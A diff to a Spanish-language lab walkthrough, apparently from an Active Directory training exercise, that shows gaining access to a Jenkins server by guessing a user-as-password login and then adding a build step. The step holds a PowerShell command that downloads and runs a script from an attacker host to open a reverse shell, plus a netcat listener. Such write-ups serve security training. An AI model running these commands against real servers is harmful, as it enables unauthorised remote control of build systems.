@@ -60,13 +60,13 @@ Realizaremos los mismos pasos de obtener una Reverse Shell igual que hemos hecho
 Accederemos al servidor de Jenkins que conocemos que se haya en la IP *172.16.3.11:8080*
 Nos encontramos que es la versión *2.361.4*, en el panel de People podemos enumerar tres cuentas y antes de hacer fuerza bruta probaremos entre ellas a usar *User as Password* en este caso *builduser::builduser* en el panel de login
 
-Con este usuario se nos permite modificar un proyecto ya existente en la modificación de este, procederemos a acceder a *BuildHistoy -Configure* -> *Add build step*
-Una vez en esa zona de configuración nos mandaremos una reverse shell a nuestra maquina
+Con este usuario se nos permite modificar un proyecto ya existente en la modificación de este, procederemos a acceder a *BuildHistoy* -> *Configure* -> *Build Step*
+Una vez en esa zona de configuración cargaremos una reverse shell hacia nuesta maquina de atacante
 ```shell
 powershell iex (iwr -UseBasicParsing http://<attacker_machine>/Invoke-PowershellTcp.ps1);power -Reverse -IPAddress <attacker_machine> -Port 1339
 ```
 
-Una vez tenemos introducido el reverse shell lo guardaremos y ejecutaremos *netcat* poniéndonos en escucha en el puerto selecciona
+Una vez tenemos introducido el reverse shell lo guardaremos y ejecutaremos *netcat* en nuestra maquina de atacante poniéndonos en escucha en el puerto indicado en el payload
 ```shell
 C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 1339
 ```
